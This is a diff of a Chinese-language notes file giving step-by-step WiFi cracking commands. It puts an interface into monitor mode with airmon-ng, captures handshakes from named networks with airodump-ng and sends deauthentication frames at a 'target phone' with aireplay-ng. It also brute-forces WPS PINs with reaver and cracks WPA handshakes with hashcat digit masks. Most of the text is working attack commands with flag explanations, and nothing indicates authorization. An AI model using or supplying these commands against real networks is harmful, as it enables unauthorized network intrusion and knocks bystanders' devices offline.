@@ -41,12 +41,14 @@ sudo airmon-ng check kill   ###########
 步骤3：在监控模式下启动wlan0 。
 
 sudo airmon-ng start wlx000d18302a4a   ########### 
+sudo airmon-ng start wlan0
+
 
  rfkill list   ####
 
           0: phy0: Wireless LAN
-                        Soft blocked: no
-                        Hard blocked: no   *****
+                   Soft blocked: no
+                   Hard blocked: no   *****
 
  rfkill unblock 0
 
@@ -54,7 +56,8 @@ sudo airmon-ng start wlx000d18302a4a   ###########
 
 利用iw开启monitor模式：iw dev wlan0 interface add wlan0mon type monitor
 
-     sudo service network-manager start 
+恢复WiFi:
+     sudo service network-manager start  
 ===========================================
 从无线模块的显示列表可以看出，序号2的wifi模块是软硬件是可以启动的，所以，只要将前面默认的模块移出即可；使用命令：
 
@@ -79,8 +82,8 @@ sudo airodump-ng -c 6 --bssid 80:EA -w  TP-LINK_xxxx wlan0mon     ######
 
 sudo airodump-ng -c 11 --bssid A8:57 -w  CMCC-xxxx wlan0mon 
 
-
-
+-c : wifi频道
+-w : 保存名字
 ---------------------------------------------------------------------
 
 
@@ -95,6 +98,7 @@ sudo aireplay-ng -0 10 -a A8:57 -c 20:EE wlan0mon        ########
 ireplay-ng：注入帧-0：用于取消认证10：发送的去认证报文数
 -a：对于目标网络的bssid
 -c: 目标手机
+-0 10: 攻击10次
 wlan0mon：接口名称。
 
 客户端与目标网络断开连接时。他尝试重新连接到网络，当他这样做时，您将在终端的上一个窗口中得到称为WPA握手的信息。
@@ -158,7 +162,7 @@ sudo wash -i wlan0mon    #########
 已淘汰 reaver
 sudo reaver -i wlan0mon -b A8:57 -a -c 11 -e CMCC-XX -l 60 -S -vv
 
-sudo reaver -i wlan0mon -b E4:47 -c 8 -vv -S     -A  -F  -l 60
+sudo reaver -i wlan0mon -b E4:47 -c 8 -M -S -K -vv 
 
 
     -i，开启了监听模式的网络接口名
@@ -175,7 +179,7 @@ sudo reaver -i wlan0mon -b E4:47 -c 8 -vv -S     -A  -F  -l 60
     -t，接收超时周期（默认10）
     -F，忽略帧校验错误
 
-sudo reaver -i wlan0mon -b BC:D1 -p 81103355 -vv
+sudo reaver -i wlan0mon -b BC:D1  -vv
 
 
 
@@ -332,7 +336,21 @@ b | 0x00 - 0xff                             匹配密码空格
 
 
 
+hashcat --version
 
+使用 hashcat 官网提供的在线工具进行格式转换：https://hashcat.net/cap2hashcat/
+将握手包转换成 hc22000 格式
+
+hashcat -a 3 -m 22000 XXX.hc22000 ?d?d?d?d?d?d?d?d --force
+
+
+hashcat -a 3 -m 22000 C:\tools\temp\bxxx01.hc22000 ?d?d?d?d?d?d?d?d?d?d?d --force
+
+显示破解完成的密码
+hashcat  -m 22000 11.hccapx  pass.txt --force --show
+
+--show      将hashlist与potfile比较; 显示破解的哈希    
+--left      将hashlist与potfile比较; 显示未破裂的哈希  
 
 
 
@@ -372,21 +390,7 @@ reaver –i mon0 –b MAC –a –S –vv –d 3 –t 3 //开始穷举PIN码
 
 
 
-hashcat --version
 
-使用 hashcat 官网提供的在线工具进行格式转换：https://hashcat.net/cap2hashcat/
-将握手包转换成 hc22000 格式
-
-hashcat -a 3 -m 22000 XXX.hc22000 ?d?d?d?d?d?d?d?d --force
-
-
-hashcat -a 3 -m 22000 C:\tools\temp\bxxx01.hc22000 ?d?d?d?d?d?d?d?d?d?d?d --force
-
-显示破解完成的密码
-hashcat  -m 22000 11.hccapx  pass.txt --force --show
-
---show      将hashlist与potfile比较; 显示破解的哈希    
---left      将hashlist与potfile比较; 显示未破裂的哈希  
 
 
 
